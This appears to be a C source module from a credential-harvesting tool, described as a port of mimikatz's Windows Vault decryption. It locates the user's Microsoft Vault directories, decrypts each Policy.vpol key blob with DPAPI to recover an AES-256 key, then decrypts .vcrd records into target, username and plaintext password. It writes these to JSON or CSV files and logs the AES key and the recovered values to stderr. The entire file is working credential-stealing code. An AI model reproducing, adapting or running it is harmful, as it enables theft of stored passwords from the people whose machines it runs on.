/* bd_vault.c - Windows Vault offline decryption.
 * Port of mimikatz kuhl_m_dpapi_vault + kull_m_cred.c:
 *
 *   Policy.vpol  (RAW)  -> VAULT_POLICY{ key{ KeyBlob } }
 *   KeyBlob      (DPAPI) -> MBDK -> aes128 + aes256
 *   <guid>.vcrd  (RAW)  -> VAULT_CREDENTIAL{ attributes }
 *   attribute.data --AES-CBC(aes256|aes128, attribute.IV)--> value
 *
 * IMPORTANT: Policy.vpol and .vcrd are raw structs (NOT DPAPI); only KeyBlob
 * is DPAPI-encrypted. Resource(100)/Identity(101)/Authenticator(102) use AES-256.
 */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "bd.h"

extern void  *malloc(size_t);
extern void   free(void *);
extern void  *memcpy(void *, const void *, size_t);
extern void  *memset(void *, int, size_t);
extern size_t strlen(const char *);
extern int    _snprintf(char *, size_t, const char *, ...);
extern int    _write(int, const void *, unsigned);
extern char  *getenv(const char *);

#define VDBG(...) do { char vb_[512]; _snprintf(vb_, sizeof(vb_), __VA_ARGS__); _write(2, vb_, (unsigned)strlen(vb_)); _write(2, "\n", 1); } while (0)

static unsigned int rd32(const unsigned char *p) {
    return (unsigned)p[0] | ((unsigned)p[1] << 8) | ((unsigned)p[2] << 16) | ((unsigned)p[3] << 24);
}
static int is_mbdk(const unsigned char *p) {
    return p[0] == 0x4b && p[1] == 0x44 && p[2] == 0x42 && p[3] == 0x4d;
}
static void hexstr(const unsigned char *b, size_t n, char *out, size_t cap) {
    size_t i; size_t lim = n; if (lim > (cap - 1) / 2) lim = (cap - 1) / 2;
    for (i = 0; i < lim; i++) _snprintf(out + i * 2, cap - i * 2, "%02x", b[i]);
}

static int vault_policy_key(const unsigned char *data, DWORD size, unsigned char aes256[32]) {
    unsigned int keySize128, keySize256;
    const unsigned char *blk2;
    if (size < 8) return -1;
    keySize128 = rd32(data);
    if (keySize128 < 0x24 || keySize128 + 4 > size) return -1;
    blk2 = data + 4 + keySize128;
    if ((DWORD)(blk2 - data) + 8 > size) return -1;
    keySize256 = rd32(blk2);
    if (keySize256 < 0x34 || (DWORD)(blk2 - data) + 4 + keySize256 > size) return -1;
    if (is_mbdk(blk2 + 12) && rd32(blk2 + 8) == 1 && rd32(blk2 + 20) == 32) {
        memcpy(aes256, blk2 + 24, 32);
        return 0;
    }
    return -1;
}

/* ------------------------------------------------------------- emit ctx -- */
typedef struct {
    bd_out *out;
    bd_sb   sb;
    int     fmt;
    int     rows;
    int     first;
    char    filePath[700];
} vault_emit;

static void w2u(const wchar_t *w, char *out, size_t cap) {
    if (!w) { out[0] = 0; return; }
    WideCharToMultiByte(CP_UTF8, 0, w, -1, out, (int)cap, NULL, NULL);
    out[cap - 1] = 0;
}
static void bytes_to_str(const unsigned char *b, size_t n, char *out, size_t cap) {
    size_t i;
    if (!b || !n) { out[0] = 0; return; }
    if (n >= 2 && (n & 1) == 0) {
        int u16 = 1;
        for (i = 1; i < n; i += 2) if (b[i] != 0) { u16 = 0; break; }
        if (u16) { w2u((const wchar_t *)b, out, cap); return; }
    }
    for (i = 0; i < n; i++) {
        unsigned char c = b[i];
        if (c < 0x20 && c != '\t' && c != '\r' && c != '\n') { out[0] = 0; return; }
    }
    { size_t take = n < cap - 1 ? n : cap - 1; memcpy(out, b, take); out[take] = 0; }
}

static void emit_row(vault_emit *e, const char *target, const char *user, const char *pass) {
    if (e->fmt == 0) {
        if (!e->first) bd_sb_put(&e->sb, ",");
        bd_sb_put(&e->sb, "{\"target\":");
        bd_sb_json_str(&e->sb, target);
        bd_sb_put(&e->sb, ",\"type\":\"vault_domain_password\",\"username\":");
        bd_sb_json_str(&e->sb, user);
        bd_sb_put(&e->sb, ",\"password\":");
        bd_sb_json_str(&e->sb, pass);
        bd_sb_put(&e->sb, "}");
    } else {
        bd_sb_csv_field(&e->sb, target); bd_sb_put(&e->sb, ",");
        bd_sb_put(&e->sb, "vault_domain_password"); bd_sb_put(&e->sb, ",");
        bd_sb_csv_field(&e->sb, user); bd_sb_put(&e->sb, ",");
        bd_sb_csv_field(&e->sb, pass); bd_sb_put(&e->sb, "\r\n");
    }
    if (e->out->human && e->out->chunk) {
        char line[1000];
        int n = _snprintf(line, sizeof(line), "    %s | %s | %s\r\n",
                          target ? target : "", user ? user : "-", pass ? pass : "-");
        if (n > 0) e->out->chunk(e->out->ctx, line, n);
    }
    e->first = 0;
    e->rows++;
}

static int decrypt_attr(const unsigned char *attr, const unsigned char *aes256,
                        char *out, size_t cap) {
    unsigned int id = rd32(attr);
    const unsigned char *p = attr + 16;
    unsigned int szData, szIV = 0;
    const unsigned char *iv = NULL, *data;
    unsigned char *pt; size_t ptlen = 0;

    if (id >= 100) p += 4;
    szData = rd32(p); p += 4;
    if (szData == 0) { VDBG("[V] attr id=%u: szData==0", id); out[0] = 0; return -1; }
    szData--;
    if (*p) {
        szIV = rd32(p + 1); p += 5;
        szData -= 4 + szIV;
        iv = p; p += szIV;
    } else {
        p += 1;
    }
    data = p;
    if (szData == 0 || szData > 4096 || szIV != 16) {
        VDBG("[V] attr id=%u: bad szData=%u szIV=%u", id, szData, szIV);
        out[0] = 0; return -1;
    }
    pt = (unsigned char *)malloc(szData + 16);
    if (!pt) { out[0] = 0; return -1; }
    if (bd_aes_cbc_decrypt(aes256, 32, iv, data, szData, pt, &ptlen) != 0 || ptlen == 0) {
        VDBG("[V] attr id=%u: AES decrypt failed", id);
        free(pt); out[0] = 0; return -1;
    }
    bytes_to_str(pt, ptlen, out, cap);
    VDBG("[V] attr id=%u szData=%u -> \"%s\"", id, szData, out);
    free(pt);
    return 0;
}

static int parse_vcrd(const unsigned char *rec, size_t reclen, const unsigned char *aes256,
                      char *target, size_t tcap, char *user, size_t ucap, char *pass, size_t pcap) {
    unsigned int dwFriendlyName, dwMapSize, nMap, i;
    const unsigned char *map;
    target[0] = user[0] = pass[0] = 0;

    if (reclen < 40) return -1;
    dwFriendlyName = rd32(rec + 36);
    if (40 + (size_t)dwFriendlyName + 4 > reclen) return -1;
    dwMapSize = rd32(rec + 40 + dwFriendlyName);
    if (dwMapSize % 12 != 0 || 44 + (size_t)dwFriendlyName + dwMapSize > reclen) {
        VDBG("[V] vcrd: bad dwFriendlyName=%u dwMapSize=%u reclen=%zu", dwFriendlyName, dwMapSize, reclen);
        return -1;
    }
    map = rec + 44 + dwFriendlyName;
    nMap = dwMapSize / 12;
    VDBG("[V] vcrd: nMap=%u", nMap);

    for (i = 0; i < nMap; i++) {
        unsigned int id = rd32(map + i * 12);
        unsigned int off = rd32(map + i * 12 + 4);
        char val[600];
        if (off >= reclen) continue;
        if (decrypt_attr(rec + off, aes256, val, sizeof(val)) != 0) continue;
        if (id == 100) { size_t n = strlen(val); if (n >= tcap) n = tcap - 1; memcpy(target, val, n); target[n] = 0; }
        else if (id == 101) { size_t n = strlen(val); if (n >= ucap) n = ucap - 1; memcpy(user, val, n); user[n] = 0; }
        else if (id == 102) { size_t n = strlen(val); if (n >= pcap) n = pcap - 1; memcpy(pass, val, n); pass[n] = 0; }
    }
    return (pass[0] || user[0]) ? 0 : -1;
}

static int process_vault_dir(const char *dir, const unsigned char *aes256, vault_emit *e) {
    char pattern[640];
    WIN32_FIND_DATAA fd;
    HANDLE h;
    _snprintf(pattern, sizeof(pattern), "%s\\*.vcrd", dir);
    h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return -1;
    do {
        char full[700];
        char *data = NULL; size_t dlen = 0;
        char target[400], user[400], pass[400];
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        if (!_snprintf(full, sizeof(full), "%s\\%s", dir, fd.cFileName)) continue;
        if (bd_read_file(full, &data, &dlen) != 0 || !data) continue;
        VDBG("[V] vcrd file %s (%zu bytes)", fd.cFileName, dlen);
        if (parse_vcrd((const unsigned char *)data, dlen, aes256, target, sizeof(target), user, sizeof(user), pass, sizeof(pass)) == 0)
            emit_row(e, target, user, pass);
        free(data);
    } while (FindNextFileA(h, &fd));
    FindClose(h);
    return 0;
}

void bd_vault_extract(bd_out *out, int *files) {
    char vdir[640], pattern[640];
    char *localapp = getenv("LOCALAPPDATA");
    WIN32_FIND_DATAA fd;
    HANDLE h;
    vault_emit e;

    if (!localapp) return;
    if (!_snprintf(vdir, sizeof(vdir), "%s\\Microsoft\\Vault", localapp)) return;
    if (!_snprintf(pattern, sizeof(pattern), "%s\\*", vdir)) return;

    memset(&e, 0, sizeof(e));
    e.out = out;
    e.fmt = out->fmt;
    e.first = 1;
    bd_sb_init(&e.sb);
    if (e.fmt == 0)
        bd_sb_put(&e.sb, "{\"browser\":\"Windows\",\"profile\":\"vault\",\"category\":\"wincreds\",\"rows\":[");
    else
        bd_sb_put(&e.sb, "target,type,username,password\r\n");

    h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) { VDBG("[V] no vault dir under %s", vdir); bd_sb_free(&e.sb); return; }
    do {
        char sub[700], policy[700];
        char *data = NULL; size_t dlen = 0;
        unsigned char aes256[32];
        int gotKey = 0;

        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (fd.cFileName[0] == '.') continue;
        if (!bd_path_join(sub, sizeof(sub), vdir, fd.cFileName)) continue;
        VDBG("[V] vault dir: %s", fd.cFileName);

        if (!bd_path_join(policy, sizeof(policy), sub, "Policy.vpol")) continue;
        if (bd_read_file(policy, &data, &dlen) != 0 || !data) continue;
        /* Policy.vpol is a RAW VAULT_POLICY struct (not DPAPI) */
        {
            unsigned int dwName = rd32((const unsigned char *)data + 20);
            const unsigned char *keyp;
            unsigned int dwKeyBlob;
            VDBG("[V] policy dwName=%u dlen=%zu", dwName, dlen);
            if ((size_t)(24 + dwName + 16) <= dlen) {
                keyp = (const unsigned char *)data + 24 + dwName + 16;
                if (keyp + 36 <= (const unsigned char *)data + dlen) {
                    dwKeyBlob = rd32(keyp + 32);
                    VDBG("[V] key dwKeyBlob=%u", dwKeyBlob);
                    if (dwKeyBlob && keyp + 36 + dwKeyBlob <= (const unsigned char *)data + dlen) {
                        unsigned char *kpt = NULL; size_t kptlen = 0;
                        if (bd_dpapi_decrypt(keyp + 36, dwKeyBlob, &kpt, &kptlen) == 0 && kpt) {
                            if (vault_policy_key(kpt, (DWORD)kptlen, aes256) == 0) {
                                char hx[100]; hexstr(aes256, 32, hx, sizeof(hx));
                                VDBG("[V] aes256 = %s", hx);
                                gotKey = 1;
                            } else VDBG("[V] vault_policy_key FAILED (kptlen=%zu)", kptlen);
                            bd_local_free((unsigned long)(size_t)kpt);
                        } else VDBG("[V] DPAPI decrypt of KeyBlob FAILED");
                    }
                }
            } else VDBG("[V] policy too short");
        }
        free(data);
        if (gotKey) process_vault_dir(sub, aes256, &e);
    } while (FindNextFileA(h, &fd));
    FindClose(h);

    if (e.fmt == 0) bd_sb_put(&e.sb, "]}");
    if (out->outDir && *out->outDir && e.rows) {
        _snprintf(e.filePath, sizeof(e.filePath), "%s\\wincreds_vault.%s",
                  out->outDir, e.fmt == 0 ? "json" : "csv");
        bd_write_file(e.filePath, e.sb.buf, e.sb.len);
        if (out->logf)
            out->logf(out->ctx, "[+] Windows/vault wincreds: %d rows -> %s", e.rows, e.filePath);
    } else if (out->logf && e.rows) {
        out->logf(out->ctx, "[+] Windows/vault wincreds: %d rows", e.rows);
    }
    if (files && out->outDir && *out->outDir && e.rows) (*files)++;
    bd_sb_free(&e.sb);
}
